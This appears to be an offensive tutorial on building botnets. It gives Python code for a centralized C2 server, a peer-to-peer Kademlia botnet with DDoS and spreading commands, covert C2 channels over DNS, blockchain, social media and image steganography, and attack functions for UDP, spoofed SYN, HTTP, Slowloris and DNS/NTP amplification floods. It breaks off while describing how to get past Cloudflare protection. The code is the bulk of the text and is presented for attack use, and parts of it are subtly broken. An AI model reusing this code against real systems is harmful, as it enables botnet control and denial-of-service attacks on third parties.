Advanced Botnet Architecture, C2 Infrastructure, and DDoS Mechanisms
Table of Contents
Botnet Architecture Patterns
Command and Control (C2) Systems
DDoS Attack Vectors
DDoS Bypass Techniques
Stealth and Evasion Mechanisms
Proof of Concepts
1. Botnet Architecture Patterns
Centralized Architecture (Star Topology)
python
#!/usr/bin/env python3
"""
Centralized Botnet Architecture
Traditional IRC-based or HTTP-based botnets
Single point of failure but easy to manage
"""

import asyncio
import ssl
import json
import hashlib
import time
import random
from typing import Dict, Set, Optional
from dataclasses import dataclass, field
from enum import Enum

class BotStatus(Enum):
    IDLE = "idle"
    ACTIVE = "active"
    BUSY = "busy"
    OFFLINE = "offline"
    UPDATE_PENDING = "update_pending"

@dataclass
class Bot:
    """
    Bot node representation
    
    Design decisions:
    - UUIDv4 for unique identification across reinstalls
    - Last seen tracking for dead bot detection
    - Capability flags for task routing (e.g., only Windows bots do X)
    - Geolocation for geo-targeted attacks
    """
    uuid: str
    ip: str
    port: int
    hostname: str
    os_type: str  # windows/linux/macos/android/ios
    arch: str     # x86/x64/arm/arm64
    privileges: str  # user/admin/root
    status: BotStatus
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    capabilities: Set[str] = field(default_factory=set)
    current_task: Optional[str] = None
    success_rate: float = 1.0  # For adaptive task distribution
    
    def is_alive(self, timeout: int = 300) -> bool:
        """Check if bot is responsive"""
        return (time.time() - self.last_seen) < timeout

class CentralizedC2:
    """
    Centralized Command and Control Server
    
    Architecture Benefits:
    - Simple command distribution
    - Easy bot tracking and statistics
    - Efficient task coordination
    
    Architecture Weaknesses:
    - Single point of failure
    - Easy to identify and takedown
    - C2 discovery compromises entire botnet
    """
    
    def __init__(self, host: str = "0.0.0.0", port: int = 443):
        self.host = host
        self.port = port
        
        # Bot registry: uuid -> Bot
        self.bots: Dict[str, Bot] = {}
        
        # Task queue: task_id -> Task
        self.tasks: Dict[str, dict] = {}
        
        # Task results: task_id -> Result
        self.results: Dict[str, list] = {}
        
        # Load balancer for task distribution
        self.task_queue = asyncio.Queue()
        
        # Rate limiting: ip -> (count, timestamp)
        self.rate_limits: Dict[str, tuple] = {}
        
        # SSL context for encrypted communications
        self.ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.ssl_ctx.load_cert_chain("server.crt", "server.key")
        
        # Domain fronting configuration (bypasses simple filtering)
        self.allowed_hosts = ["cdn.example.com", "api.example.com"]
        
    async def start(self):
        """Start C2 server with multiple protocol handlers"""
        await asyncio.gather(
            self.http_listener(),
            self.dns_listener(),
            self.https_listener(),
        )
        
    async def https_listener(self):
        """
        Primary HTTPS C2 channel
        
        Why HTTPS:
        1. Blends with normal web traffic (port 443)
        2. Encrypted (defeats simple DPI)
        3. Corporate firewalls allow outbound HTTPS
        4. Can use domain fronting
        """
        server = await asyncio.start_server(
            self.handle_bot_connection,
            self.host,
            self.port,
            ssl=self.ssl_ctx
        )
        
        print(f"[*] HTTPS C2 listening on {self.host}:{self.port}")
        
        async with server:
            await server.serve_forever()
            
    async def handle_bot_connection(self, reader: asyncio.StreamReader, 
                                    writer: asyncio.StreamWriter):
        """
        Handle individual bot connection
        
        Protocol:
        1. Bot sends encrypted beacon with metadata
        2. Server responds with tasks or sleep command
        3. Bot executes and returns results
        4. Connection closes (stateless design)
        """
        addr = writer.get_extra_info('peername')
        
        try:
            # Read length-prefixed message
            length_data = await reader.read(4)
            if len(length_data) != 4:
                return
                
            msg_length = int.from_bytes(length_data, 'big')
            encrypted_data = await reader.read(msg_length)
            
            # Decrypt (AES-256-GCM with pre-shared key)
            data = self.decrypt(encrypted_data)
            beacon = json.loads(data)
            
            # Process beacon
            bot = await self.process_beacon(beacon, addr)
            
            # Generate response
            response = await self.generate_response(bot)
            
            # Encrypt and send
            encrypted_response = self.encrypt(json.dumps(response))
            writer.write(len(encrypted_response).to_bytes(4, 'big'))
            writer.write(encrypted_response)
            await writer.drain()
            
        except Exception as e:
            print(f"[-] Error handling bot {addr}: {e}")
        finally:
            writer.close()
            
    async def process_beacon(self, beacon: dict, addr: tuple) -> Bot:
        """
        Process incoming bot beacon
        
        Beacon contains:
        - uuid: Unique identifier
        - timestamp: Bot's local time (detect VM time skew)
        - system_info: OS, arch, privileges
        - task_results: Results of previous tasks
        - capabilities: What this bot can do
        """
        uuid = beacon.get('uuid')
        
        if uuid in self.bots:
            # Update existing bot
            bot = self.bots[uuid]
            bot.last_seen = time.time()
            bot.ip = addr[0]
            bot.status = BotStatus.IDLE
            
            # Process task results
            if 'results' in beacon:
                await self.process_results(uuid, beacon['results'])
        else:
            # Register new bot
            bot = Bot(
                uuid=uuid,
                ip=addr[0],
                port=addr[1],
                hostname=beacon.get('hostname', 'unknown'),
                os_type=beacon.get('os', 'unknown'),
                arch=beacon.get('arch', 'unknown'),
                privileges=beacon.get('priv', 'user'),
                status=BotStatus.IDLE,
                capabilities=set(beacon.get('caps', []))
            )
            self.bots[uuid] = bot
            print(f"[+] New bot registered: {uuid} ({bot.os_type}/{bot.arch})")
            
        return bot
        
    async def generate_response(self, bot: Bot) -> dict:
        """
        Generate command response for bot
        
        Strategy:
        1. Check for targeted tasks specific to this bot
        2. Check for geo-targeted tasks
        3. Check for capability-specific tasks
        4. Return global broadcast tasks
        5. Default: sleep with jitter
        """
        response = {
            'action': 'sleep',
            'duration': random.randint(60, 300),  # Jitter prevents pattern detection
            'task_id': None
        }
        
        # Priority 1: Direct assignment
        for task_id, task in self.tasks.items():
            if task.get('assigned_to') == bot.uuid and task['status'] == 'pending':
                response = {
                    'action': task['action'],
                    'params': task['params'],
                    'task_id': task_id
                }
                task['status'] = 'assigned'
                bot.current_task = task_id
                bot.status = BotStatus.BUSY
                break
                
        # Priority 2: Capability matching
        if response['action'] == 'sleep':
            for task_id, task in self.tasks.items():
                if task['status'] == 'pending':
                    required_caps = set(task.get('required_caps', []))
                    if required_caps.issubset(bot.capabilities):
                        response = {
                            'action': task['action'],
                            'params': task['params'],
                            'task_id': task_id
                        }
                        task['status'] = 'assigned'
                        task['assigned_to'] = bot.uuid
                        bot.current_task = task_id
                        bot.status = BotStatus.BUSY
                        break
                        
        return response
        
    def encrypt(self, data: str) -> bytes:
        """AES-256-GCM encryption with rotating keys"""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        key = self.get_daily_key()
        nonce = os.urandom(12)
        aesgcm = AESGCM(key)
        
        ciphertext = aesgcm.encrypt(nonce, data.encode(), None)
        return nonce + ciphertext
        
    def decrypt(self, data: bytes) -> str:
        """Decrypt bot communication"""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        key = self.get_daily_key()
        nonce = data[:12]
        ciphertext = data[12:]
        
        aesgcm = AESGCM(key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext.decode()
        
    def get_daily_key(self) -> bytes:
        """Derive daily encryption key"""
        # Key rotation prevents long-term traffic analysis
        day = int(time.time() / 86400)
        return hashlib.pbkdf2_hmac('sha256', b'master_key', 
                                   str(day).encode(), 100000)
Peer-to-Peer Architecture
python
#!/usr/bin/env python3
"""
Peer-to-Peer Botnet Architecture

Resilient to takedowns - no single point of failure
Uses DHT (Distributed Hash Table) for peer discovery and command propagation

Design Patterns:
- Kademlia DHT for peer discovery
- Gossip protocol for command propagation
- Blockchain for immutable command history (optional)
- Steganographic C2 (commands hidden in images/torrents)
"""

import hashlib
import random
import asyncio
from typing import List, Dict, Set, Optional
from dataclasses import dataclass
import struct

@dataclass
class P2PNode:
    """DHT Node representation"""
    node_id: bytes  # 160-bit node ID
    ip: str
    port: int
    last_seen: float
    
    def distance_to(self, other_id: bytes) -> int:
        """XOR distance metric for Kademlia"""
        return int.from_bytes(self.node_id, 'big') ^ int.from_bytes(other_id, 'big')

class KademliaDHT:
    """
    Kademlia Distributed Hash Table
    
    Why Kademlia:
    1. O(log n) lookup time
    2. Self-organizing (nodes come and go)
  3. Resistant to censorship (no central authority)
    4. Used by BitTorrent (blends with legitimate traffic)
    
    Key Concepts:
    - XOR distance metric
    - k-buckets for routing table
    - iterative lookups
    """
    
    def __init__(self, node_id: Optional[bytes] = None, 
                 k: int = 20, alpha: int = 3):
        """
        k: Bucket size (max nodes per bucket)
        alpha: Parallelism factor for lookups
        """
        self.node_id = node_id or self._generate_node_id()
        self.k = k
        self.alpha = alpha
        
        # Routing table: bucket index -> list of nodes
        # Bucket index = position of first differing bit
        self.buckets: Dict[int, List[P2PNode]] = {}
        
        # Storage: key -> (value, timestamp, publisher)
        self.storage: Dict[bytes, tuple] = {}
        
        # Commands stored in DHT
        self.command_key = hashlib.sha1(b"botnet_commands").digest()
        
    def _generate_node_id(self) -> bytes:
        """Generate random 160-bit node ID"""
        return os.urandom(20)
        
    def _bucket_index(self, node_id: bytes) -> int:
        """Calculate bucket index based on XOR distance"""
        distance = int.from_bytes(self.node_id, 'big') ^ int.from_bytes(node_id, 'big')
        if distance == 0:
            return -1  # Self
            
        # Find position of highest set bit
        return distance.bit_length() - 1
        
    def update_routing_table(self, node: P2PNode):
        """
        Update routing table with new node
        
        Kademlia rules:
        1. If bucket not full, add node
        2. If bucket full, ping least-recently seen
        3. If no response, replace with new node
        """
        if node.node_id == self.node_id:
            return
            
        idx = self._bucket_index(node.node_id)
        
        if idx not in self.buckets:
            self.buckets[idx] = []
            
        bucket = self.buckets[idx]
        
        # Check if already in bucket
        for i, n in enumerate(bucket):
            if n.node_id == node.node_id:
                # Update last seen, move to end
                bucket[i].last_seen = time.time()
                bucket.append(bucket.pop(i))
                return
                
        if len(bucket) < self.k:
            bucket.append(node)
        else:
            # Bucket full, ping oldest
            oldest = bucket[0]
            if not self._ping(oldest):
                # Replace dead node
                bucket[0] = node
                
    def _ping(self, node: P2PNode) -> bool:
        """Send ping to check if node is alive"""
        # Implementation would send actual ping
        return (time.time() - node.last_seen) < 3600
        
    def find_node(self, target_id: bytes) -> List[P2PNode]:
        """
        Find k closest nodes to target_id
        
        Algorithm:
        1. Query alpha closest known nodes
        2. From responses, select closer nodes
        3. Repeat until no closer nodes found
        4. Return k closest
        """
        # Start with nodes from appropriate bucket
        idx = self._bucket_index(target_id)
        
        candidates = []
        for i in range(max(0, idx-1), min(160, idx+2)):
            if i in self.buckets:
                candidates.extend(self.buckets[i])
                
        # Sort by distance to target
        candidates.sort(key=lambda n: 
            int.from_bytes(n.node_id, 'big') ^ int.from_bytes(target_id, 'big'))
            
        return candidates[:self.k]
        
    def store(self, key: bytes, value: bytes):
        """Store key-value pair in DHT"""
        self.storage[key] = (value, time.time(), self.node_id)
        
        # Replicate to k closest nodes
        closest = self.find_node(key)
        for node in closest:
            self._send_store(node, key, value)
            
    def _send_store(self, node: P2PNode, key: bytes, value: bytes):
        """Send store RPC to node"""
        # Network implementation
        pass
        
    def find_value(self, key: bytes) -> Optional[bytes]:
        """Retrieve value from DHT"""
        if key in self.storage:
            return self.storage[key][0]
            
        # Search network
        closest = self.find_node(key)
        for node in closest:
            value = self._send_find_value(node, key)
            if value:
                return value
        return None
        
    def propagate_command(self, command: dict):
        """
        Propagate command through network
        
        Uses gossip protocol for reliability:
        1. Store command in DHT at well-known key
        2. Push to k closest nodes
        3. Nodes propagate to their peers
        4. Eventually all nodes receive command
        """
        command_data = json.dumps(command).encode()
        command_hash = hashlib.sha256(command_data).digest()
        
        # Store in DHT
        self.store(self.command_key, command_data)
        
        # Gossip to peers
        self._gossip_command(command_hash, command_data)
        
    def _gossip_command(self, command_hash: bytes, command_data: bytes, 
                        ttl: int = 7):
        """
        Gossip protocol for command propagation
        
        TTL prevents infinite propagation
        """
        if ttl <= 0:
            return
            
        # Select random subset of peers
        all_peers = []
        for bucket in self.buckets.values():
            all_peers.extend(bucket)
            
        gossip_targets = random.sample(all_peers, 
                                       min(len(all_peers), self.k))
        
        for peer in gossip_targets:
            # Send command
            self._send_command(peer, command_hash, command_data, ttl-1)
            
    def _send_command(self, peer: P2PNode, command_hash: bytes,
                      command_data: bytes, ttl: int):
        """Send command to peer"""
        # Network implementation
        pass

class P2PBot:
    """
    Peer-to-Peer Bot Implementation
    
    No direct C2 connection - all communication via DHT
    """
    
    def __init__(self):
        self.dht = KademliaDHT()
        self.commands_received = set()  # Prevent replay
        self.peers: Set[P2PNode] = set()
        
    async def join_network(self, bootstrap_nodes: List[tuple]):
        """
        Join P2P network via bootstrap nodes
        
        Bootstrap nodes can be hardcoded, from previous session,
        or discovered via DHT bootstrap protocols
        """
        for ip, port in bootstrap_nodes:
            await self._connect_to_peer(ip, port)
            
        # Start maintenance tasks
        await asyncio.gather(
            self._maintain_peers(),
            self._listen_for_commands(),
            self._execute_tasks(),
        )
        
    async def _listen_for_commands(self):
        """
        Listen for new commands via DHT
        
        Polls DHT for updates to command key
        """
        while True:
            command_data = self.dht.find_value(self.dht.command_key)
            
            if command_data:
                command = json.loads(command_data)
                command_hash = hashlib.sha256(command_data).digest()
                
                if command_hash not in self.commands_received:
                    self.commands_received.add(command_hash)
                    await self._execute_command(command)
                    
            # Random delay to avoid pattern
            await asyncio.sleep(random.randint(30, 120))
            
    async def _execute_command(self, command: dict):
        """Execute received command"""
        action = command.get('action')
        
        if action == 'ddos':
            await self._launch_ddos(command['params'])
        elif action == 'update':
            await self._self_update(command['params'])
        elif action == 'spread':
            await self._propagate_to_new_hosts(command['params'])
            
    async def _launch_ddos(self, params: dict):
        """
        Launch DDoS attack
        
        Parameters specify target, method, duration
        """
        target = params['target']
        method = params['method']  # syn, udp, http, etc.
        duration = params['duration']
        
        # Implementation in DDoS section
        pass
2. Command and Control (C2) Systems
Multi-Protocol C2
python
#!/usr/bin/env python3
"""
Multi-Protocol C2 Implementation

Uses multiple communication channels for resilience:
1. HTTPS (primary)
2. DNS (fallback, stealthy)
3. SMTP (email-based, very stealthy)
4. Blockchain (immutable, censorship-resistant)
5. Social media (Twitter, Reddit, GitHub)
"""

import dns.message
import dns.query
import dns.name
import base64
import json
import time
from abc import ABC, abstractmethod

class C2Channel(ABC):
    """Abstract base class for C2 channels"""
    
    @abstractmethod
    async def send(self, data: bytes) -> bool:
        """Send data via channel"""
        pass
        
    @abstractmethod
    async def receive(self) -> Optional[bytes]:
        """Receive data via channel"""
        pass
        
    @abstractmethod
    def check_availability(self) -> bool:
        """Check if channel is available"""
        pass

class DNSC2Channel(C2Channel):
    """
    DNS C2 Channel
    
    Why DNS:
    1. Almost always allowed through firewalls
    2. Recursive queries hide source
    3. TXT records can hold ~255 bytes
    4. Slow but very stealthy
    
    Protocol:
    - Data encoded in subdomain labels
    - Base32 encoding (DNS-safe)
    - Response via TXT record
    """
    
    def __init__(self, domain: str, dns_server: str = "8.8.8.8"):
        self.domain = domain
        self.dns_server = dns_server
        self.tx_id = 0
        
    def encode_data(self, data: bytes) -> str:
        """Encode data for DNS transport"""
        # Base32 is DNS-safe (no special chars)
        encoded = base64.b32encode(data).decode().replace('=', '')
        
        # Split into labels (max 63 chars per label)
        labels = []
        for i in range(0, len(encoded), 63):
            labels.append(encoded[i:i+63])
            
        return '.'.join(labels)
        
    async def send(self, data: bytes) -> bool:
        """Send data via DNS query"""
        encoded = self.encode_data(data)
        query_name = f"{self.tx_id}.{encoded}.{self.domain}"
        self.tx_id += 1
        
        try:
            query = dns.message.make_query(query_name, 'A')
            dns.query.udp(query, self.dns_server)
            return True
        except:
            return False
            
    async def receive(self) -> Optional[bytes]:
        """Poll for commands via DNS TXT query"""
        try:
            query = dns.message.make_query(f"cmd.{self.domain}", 'TXT')
            response = dns.query.udp(query, self.dns_server)
            
            for rrset in response.answer:
                for rdata in rrset:
                    if rdata.rdtype == dns.rdatatype.TXT:
                        txt_data = rdata.strings[0]
                        return base64.b64decode(txt_data)
        except:
            pass
        return None

class BlockchainC2Channel(C2Channel):
    """
    Blockchain C2 Channel (Bitcoin/Ethereum)
    
    Why Blockchain:
    1. Immutable command history
    2. Decentralized - cannot be taken down
    3. Pseudonymous
    4. Commands visible to anyone with wallet
    
    Protocol:
    - Commands embedded in transaction OP_RETURN
    - Or encoded in transaction amounts (satoshis)
    - Bots watch specific address for transactions
    """
    
    def __init__(self, watch_address: str, 
                 api_endpoint: str = "https://blockchain.info"):
        self.watch_address = watch_address
        self.api_endpoint = api_endpoint
        self.last_checked_block = 0
        
    async def send(self, data: bytes) -> bool:
        """
        Send data via blockchain transaction
        
        Requires wallet with funds
        """
        # Create transaction with OP_RETURN
        # This is simplified - real implementation needs wallet management
        encoded = base64.b64encode(data).decode()
        
        # Split across multiple outputs if needed
        # Or use OP_RETURN (80 byte limit)
        
        return True
        
    async def receive(self) -> Optional[bytes]:
        """Poll blockchain for new transactions"""
        import requests
        
        try:
            # Get transactions for watched address
            url = f"{self.api_endpoint}/rawaddr/{self.watch_address}"
            resp = requests.get(url)
            data = resp.json()
            
            for tx in data.get('txs', []):
                if tx['block_height'] > self.last_checked_block:
                    # Extract data from outputs
                    for out in tx.get('out', []):
                        if out.get('op_return'):
                            # Decode OP_RETURN data
                            script = out.get('script', '')
                            # Parse script for embedded data
                            pass
                            
            self.last_checked_block = data.get('txs', [{}])[0].get('block_height', 0)
            
        except:
            pass
            
        return None

class SocialMediaC2Channel(C2Channel):
    """
    Social Media C2 (Twitter, Reddit, GitHub)
    
    Why Social Media:
    1. High availability
    2. Normal traffic patterns
    3. Hard to block without collateral damage
    4. Can use steganography in images
    
    Techniques:
    - Encoded tweets/comments
    - Gist/Pastebin pastes
    - Profile bio encoding
    - Image steganography
    """
    
    def __init__(self, platform: str, account: str):
        self.platform = platform
        self.account = account
        self.last_post_id = None
        
    async def receive(self) -> Optional[bytes]:
        """Poll social media for commands"""
        if self.platform == 'twitter':
            return await self._poll_twitter()
        elif self.platform == 'reddit':
            return await self._poll_reddit()
        elif self.platform == 'github':
            return await self._poll_github()
        return None
        
    async def _poll_twitter(self) -> Optional[bytes]:
        """Poll Twitter for encoded commands"""
        # Use Twitter API or scraping
        # Look for specific hashtag or encoded text
        
        import requests
        
        headers = {
            'Authorization': 'Bearer TOKEN'  # Would need real auth
        }
        
        url = f"https://api.twitter.com/2/users/by/username/{self.account}/tweets"
        
        try:
            resp = requests.get(url, headers=headers)
            tweets = resp.json()
            
            for tweet in tweets.get('data', []):
                text = tweet.get('text', '')
                
                # Decode command from tweet
                # Could be base64, steganography, etc.
                if text.startswith('!cmd'):
                    encoded = text[4:].strip()
                    return base64.b64decode(encoded)
                    
        except:
            pass
            
        return None
        
    async def _poll_github(self) -> Optional[bytes]:
        """Poll GitHub for commands in gists/issues"""
        import requests
        
        # Check user's gists
        url = f"https://api.github.com/users/{self.account}/gists"
        
        try:
            resp = requests.get(url)
            gists = resp.json()
            
            for gist in gists:
                if gist['id'] != self.last_post_id:
                    # Fetch gist content
                    files = gist.get('files', {})
                    for filename, fileinfo in files.items():
                        if filename == 'command.enc':
                            content_url = fileinfo['raw_url']
                            content = requests.get(content_url).text
                            self.last_post_id = gist['id']
                            return base64.b64decode(content)
                            
        except:
            pass
            
        return None

class SteganographyC2:
    """
    Image-based C2 using steganography
    
    Hides commands in image LSB (Least Significant Bit)
    """
    
    def __init__(self):
        pass
        
    def encode_image(self, image_path: str, data: bytes, output_path: str):
        """
        Encode data into image using LSB steganography
        
        Capacity: width * height * 3 bits (for RGB)
        """
        from PIL import Image
        
        img = Image.open(image_path)
        pixels = list(img.getdata())
        
        # Convert data to bits
        data_bits = ''.join(format(b, '08b') for b in data)
        data_bits += '00000000'  # Null terminator
        
        if len(data_bits) > len(pixels) * 3:
            raise ValueError("Image too small for data")
            
        new_pixels = []
        data_idx = 0
        
        for pixel in pixels:
            r, g, b = pixel[:3]
            
            # Modify LSB of each channel
            if data_idx < len(data_bits):
                r = (r & 0xFE) | int(data_bits[data_idx])
                data_idx += 1
            if data_idx < len(data_bits):
                g = (g & 0xFE) | int(data_bits[data_idx])
                data_idx += 1
            if data_idx < len(data_bits):
                b = (b & 0xFE) | int(data_bits[data_idx])
                data_idx += 1
                
            new_pixels.append((r, g, b))
            
        img.putdata(new_pixels)
        img.save(output_path)
        
    def decode_image(self, image_path: str) -> bytes:
        """Extract data from steganographic image"""
        from PIL import Image
        
        img = Image.open(image_path)
        pixels = list(img.getdata())
        
        bits = ''
        for pixel in pixels:
            r, g, b = pixel[:3]
            bits += str(r & 1)
            bits += str(g & 1)
            bits += str(b & 1)
            
        # Convert bits to bytes
        data = bytearray()
        for i in range(0, len(bits), 8):
            byte = bits[i:i+8]
            if len(byte) == 8:
                data.append(int(byte, 2))
                
        # Find null terminator
        try:
            null_pos = data.index(0)
            return bytes(data[:null_pos])
        except ValueError:
            return bytes(data)
3. DDoS Attack Vectors
python
#!/usr/bin/env python3
"""
DDoS Attack Implementation

Covers all major attack vectors:
1. Volumetric (UDP flood, ICMP flood)
2. Protocol (SYN flood, ACK flood, RST flood)
3. Application Layer (HTTP flood, Slowloris, RUDY)
4. Amplification (DNS, NTP, SSDP, Memcached)
"""

import socket
import struct
import random
import asyncio
import ssl
from typing import List, Tuple
from scapy.all import *

class DDoSAttack:
    """
    DDoS Attack Framework
    
    Design Principles:
    - Async I/O for high connection counts
    - Randomization to avoid simple filtering
    - Spoofing where possible (requires raw sockets)
    - Amplification for maximum impact
    """
    
    def __init__(self):
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': 0
        }
        
    async def udp_flood(self, target_ip: str, target_port: int, 
                       duration: int, packet_size: int = 65507):
        """
        UDP Flood Attack
        
        Characteristics:
        - Connectionless (no handshake)
        - Easy to spoof source (stateless)
        - Can overwhelm target bandwidth or state tables
        
        Defense:
        - Rate limiting
        - Source validation
        - UDP-specific firewalls
        """
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Create raw socket for spoofing capability
        # Requires root/admin privileges
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Random payload
        payload = os.urandom(packet_size)
        
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                # Randomize source port for harder filtering
                sock.bind(('0.0.0.0', random.randint(1024, 65535)))
                
                sock.sendto(payload, (target_ip, target_port))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += packet_size
                
            except:
                pass
                
        sock.close()
        
    async def syn_flood(self, target_ip: str, target_port: int, duration: int):
        """
        SYN Flood Attack
        
        Exploits TCP three-way handshake:
        1. Send SYN packets with spoofed sources
        2. Server allocates resources for half-open connections
        3. Server sends SYN-ACK to fake source (no response)
        4. Connection queue fills, denying legitimate connections
        
        Defense:
        - SYN cookies (stateless SYN handling)
        - SYN proxy
        - Connection rate limiting
        """
        self.running = True
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            # Random source IP (spoofing)
            src_ip = '.'.join(str(random.randint(1, 254)) for _ in range(4))
            src_port = random.randint(1024, 65535)
            
            # Build SYN packet with Scapy
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags='S')
            
            # Random sequence number
            tcp.seq = random.randint(0, 4294967295)
            
            # TCP options (common MSS values)
            tcp.options = [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (0, 0)), ('NOP', None), ('WScale', 8)]
            
            packet = ip/tcp
            
            # Send packet
            send(packet, verbose=0)
            
            self.stats['packets_sent'] += 1
            
    async def http_flood(self, target_url: str, duration: int, 
                        concurrent_connections: int = 1000):
        """
        HTTP Flood Attack (Layer 7)
        
        Characteristics:
        - Completes full TCP handshake (harder to filter)
        - Consumes web server resources (threads, memory)
        - Can bypass simple SYN flood protection
        
        Variants:
        - GET flood: Requests large pages
        - POST flood: Uploads data
        - Random URL flood: Bypasses caching
        """
        self.running = True
        end_time = time.time() + duration
        
        async def attack_connection():
            while self.running and time.time() < end_time:
                try:
                    # Randomize request to bypass caching
                    random_path = ''.join(random.choices(
                        'abcdefghijklmnopqrstuvwxyz', k=10
                    ))
                    url = f"{target_url}/{random_path}?cache={random.randint(0, 1000000)}"
                    
                    # Random user agent
                    user_agents = [
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                        'Mozilla/5.0 (X11; Linux x86_64)',
                    ]
                    
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                    }
                    
                    # Create connection
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(
                            target_url.replace('http://', '').replace('https://', '').split('/')[0],
                            80 if target_url.startswith('http://') else 443
                        ),
                        timeout=5
                    )
                    
                    # Send HTTP request
                    request = f"GET {url} HTTP/1.1\r\n"
                    request += f"Host: {target_url}\r\n"
                    for key, value in headers.items():
                        request += f"{key}: {value}\r\n"
                    request += "\r\n"
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    # Read response (partial)
                    await reader.read(1024)
                    
                    writer.close()
                    await writer.wait_closed()
                    
                    self.stats['packets_sent'] += 1
                    
                except:
                    pass
                    
        # Launch concurrent connections
        await asyncio.gather(*[
            attack_connection() for _ in range(concurrent_connections)
        ])
        
    async def slowloris(self, target_ip: str, target_port: int, 
                       duration: int, connections: int = 1000):
        """
        Slowloris Attack
        
        Principle:
        - Opens many connections to web server
        - Sends partial HTTP headers slowly
        - Keeps connections open as long as possible
        - Exhausts server's connection pool
        
        Effectiveness:
        - Very effective against Apache (default 256 connections)
        - Less effective against nginx/event-based servers
        
        Defense:
        - Limit connection time
        - Minimum data rate requirements
        - Maximum header size/time limits
        """
        self.running = True
        end_time = time.time() + duration
        
        headers = [
            b"GET / HTTP/1.1\r\n",
            b"Host: target\r\n",
            b"User-Agent: Mozilla/5.0\r\n",
            b"Accept: */*\r\n",
        ]
        
        # Maintain connections
        open_sockets = []
        
        async def maintain_connection():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(60)
            
            try:
                sock.connect((target_ip, target_port))
                
                # Send partial headers
                for header in headers:
                    sock.send(header)
                    await asyncio.sleep(random.uniform(10, 15))
                    
                # Keep sending incomplete headers
                while self.running and time.time() < end_time:
                    sock.send(b"X-a: b\r\n")
                    await asyncio.sleep(random.uniform(10, 15))
                    
            except:
                pass
            finally:
                sock.close()
                
        # Maintain pool of connections
        while self.running and time.time() < end_time:
            # Replace dead connections
            active = len([t for t in asyncio.all_tasks() 
                         if not t.done() and t.get_name().startswith('slowloris')])
            
            needed = connections - active
            if needed > 0:
                for _ in range(min(needed, 10)):  # Create in batches
                    asyncio.create_task(
                        maintain_connection(),
                        name=f'slowloris_{random.randint(0, 1000000)}'
                    )
                    
            await asyncio.sleep(1)
            
    async def amplification_dns(self, dns_servers: List[str], 
                                target_ip: str, duration: int):
        """
        DNS Amplification Attack
        
        Principle:
        1. Send small DNS query (60 bytes) with spoofed source (target)
        2. DNS server sends large response (up to 4000 bytes) to target
        3. Amplification factor: 10-100x
        
        Requirements:
        - Open DNS resolvers (recursive)
        - Spoofing capability (no ingress filtering)
        
        Popular query for amplification: ANY isc.org
        """
        self.running = True
        end_time = time.time() + duration
        
        # DNS query for ANY isc.org (large response)
        # Transaction ID
        transaction_id = random.randint(0, 65535)
        
        # Flags: Standard query
        flags = 0x0100
        
        # Questions: 1
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        # Query name: isc.org
        query_name = b'\x03isc\x03org\x00'
        
        # Query type: ANY (255)
        query_type = 255
        query_class = 1  # IN
        
        # Build packet
        dns_packet = struct.pack('>HHHHHH', 
            transaction_id, flags, questions, answer_rrs, 
            authority_rrs, additional_rrs
        )
        dns_packet += query_name
        dns_packet += struct.pack('>HH', query_type, query_class)
        
        # Add EDNS0 for larger responses (4096 bytes)
        dns_packet += b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00'
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running and time.time() < end_time:
            for dns_server in dns_servers:
                try:
                    # Send to DNS server with spoofed source
                    # Requires raw socket or network-level access
                    sock.sendto(dns_packet, (dns_server, 53))
                    
                    self.stats['packets_sent'] += 1
                    
                except:
                    pass
                    
        sock.close()
        
    async def amplification_ntp(self, ntp_servers: List[str],
                                target_ip: str, duration: int):
        """
        NTP Amplification Attack
        
        Uses monlist command which returns list of recent clients
        Response size: ~468 bytes for 48 byte request
        Amplification: ~10x
        """
        self.running = True
        end_time = time.time() + duration
        
        # NTP monlist request
        # Mode 7 (reserved for private use), command 20 (monlist)
        ntp_packet = b'\x17\x00\x03\x2a' + b'\x00' * 44
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running and time.time() < end_time:
            for ntp_server in ntp_servers:
                try:
                    sock.sendto(ntp_packet, (ntp_server, 123))
                    self.stats['packets_sent'] += 1
                except:
                    pass
                    
        sock.close()
4. DDoS Bypass Techniques
python
#!/usr/bin/env python3
"""
DDoS Bypass Techniques

Methods to bypass:
- Cloudflare
- Akamai
- Incapsula
- AWS Shield
- Game server protection
- VoIP protection
"""

import requests
import socket
import ssl
import json
from typing import List, Optional

class DDoSBypass:
    """
    DDoS Protection Bypass Techniques
    
    These exploit architectural weaknesses in DDoS protection systems
    """
    
    def __init__(self):
        self.session = requests.Session()
        
    def cloudflare_bypass(self, target_domain: str) -> Optional[str]:
        """
        Cloudflare Bypass Techniques
        
        Methods:
        1. Find origin IP (bypasses all protection)
           - Historical DNS records
           - Subdomain enumeration (often not proxied)
           - MX records
           - SPF records
           - SSL certificate transparency logs
        
        2. Host header bypass
           - Direct IP access with correct Host header
        
        3. Cloudflare Spectrum bypass (if using non-HTTP)
        """
